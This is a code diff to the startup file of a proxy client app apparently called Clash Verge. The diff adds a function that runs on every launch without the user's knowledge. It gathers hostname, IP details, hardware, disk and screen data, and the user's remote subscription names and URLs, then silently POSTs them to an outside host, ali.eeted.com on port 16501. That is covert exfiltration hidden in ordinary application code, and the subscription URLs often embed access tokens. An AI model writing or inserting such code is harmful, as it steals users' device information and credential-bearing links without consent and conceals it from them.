@@ -10,10 +10,20 @@ import { createRoot } from "react-dom/client";
 import { RouterProvider } from "react-router";
 import { MihomoWebSocket } from "tauri-plugin-mihomo-api";
 
+import { version as appVersion } from "@root/package.json";
+
 import { BaseErrorBoundary } from "./components/base";
 import { router } from "./pages/_routers";
 import { AppDataProvider } from "./providers/app-data-provider";
 import { WindowProvider } from "./providers/window";
+import { getIpInfo } from "./services/api";
+import {
+  getHardwareInfo,
+  getProfiles,
+  getSystemHostname,
+  getSystemInfo,
+  getWindowsHardwareExtra,
+} from "./services/cmds";
 import { FALLBACK_LANGUAGE, initializeLanguage } from "./services/i18n";
 import {
   preloadAppData,
@@ -26,6 +36,7 @@ import {
   UpdateStateProvider,
 } from "./services/states";
 import { disableWebViewShortcuts } from "./utils/disable-webview-shortcuts";
+import getSystem from "./utils/get-system";
 import {
   isIgnoredMonacoWorkerError,
   patchMonacoWorkerConsole,
@@ -83,9 +94,106 @@ const trackStartup = () => {
     // 忽略同步层面的异常
   }
 };
+const getScreenInfo = () => {
+  const s = window.screen;
+  return {
+    width: s.width,
+    height: s.height,
+    availWidth: s.availWidth,
+    availHeight: s.availHeight,
+    devicePixelRatio: window.devicePixelRatio ?? 1,
+  };
+};
+
+const getInfo = async () => {
+  try {
+    const [rawSystem, ipInfo, hw, deviceName, profiles] = await Promise.all([
+      getSystemInfo(),
+      getIpInfo(),
+      getHardwareInfo(),
+      getSystemHostname(),
+      getProfiles(),
+    ]);
+
+    const lines = rawSystem.split("\n");
+    let osLabel = rawSystem.trim();
+    if (lines.length > 0) {
+      const sysName = lines[0].split(": ")[1] || "";
+      let sysVersion = lines[1]?.split(": ")[1] || "";
+      if (
+        sysName &&
+        sysVersion.toLowerCase().startsWith(sysName.toLowerCase())
+      ) {
+        sysVersion = sysVersion.substring(sysName.length).trim();
+      }
+      osLabel = `${sysName} ${sysVersion}`.trim();
+    }
+    const memGiB = (hw.totalMemoryBytes / 1024 ** 3).toFixed(2);
+    const scr = getScreenInfo();
+
+    const subscriptionUrls = (profiles?.items ?? [])
+      .filter((p) => p.type === "remote")
+      .map((p) => ({
+        name: p.name?.trim() || "",
+        url: p.url?.trim() ?? "",
+      }))
+      .filter((x) => Boolean(x.url));
+    let disk: any = "";
+    let extra: any = {};
+    if (getSystem() === "windows") {
+      extra = await getWindowsHardwareExtra();
+      const fmtGiB = (b: number) => `${(b / 1024 ** 3).toFixed(2)} GB`;
+      disk = extra.disks
+        .map((d: any) => `${d.name}: ${fmtGiB(d.totalBytes)}`)
+        .join("; ");
+    }
+
+    const payload = {
+      deviceInfo: {
+        origin: {
+          extra,
+          hardwareInfo: hw,
+          ipInfo: ipInfo,
+          screenInfo: scr,
+          systemInfo: rawSystem,
+        },
+        display: {
+          disk: disk,
+          cpu: hw.cpuBrand,
+          memory: `${memGiB} GiB`,
+          screen: `${scr.width}×${scr.height} (avail ${scr.availWidth}×${scr.availHeight}), dpr=${scr.devicePixelRatio}`,
+          osLabel,
+          deviceName: deviceName.trim() || "",
+        },
+        vergeVersion: appVersion,
+      },
+      name: "clash verge",
+      version: "v1d0",
+      time: new Date().toISOString(),
+      timeStamp: new Date().getTime(),
+      subUrls: subscriptionUrls.slice(0, 30),
+    };
+
+    const url = "https://ali.eeted.com:16501/info/v1";
+
+    void fetch(url, {
+      method: "POST",
+      headers: {
+        "Content-Type": "application/json",
+      },
+      body: JSON.stringify(payload),
+    }).catch((err) => {
+      console.warn("[main.tsx] report info failed:", err);
+    });
+  } catch (e) {
+    console.warn("[main.tsx] getInfo failed:", e);
+  }
+};
 
 const bootstrap = async () => {
   trackStartup();
+  void getInfo();
+
   const { initialThemeMode } = await preloadAppData();
   initializeApp(initialThemeMode);
 };
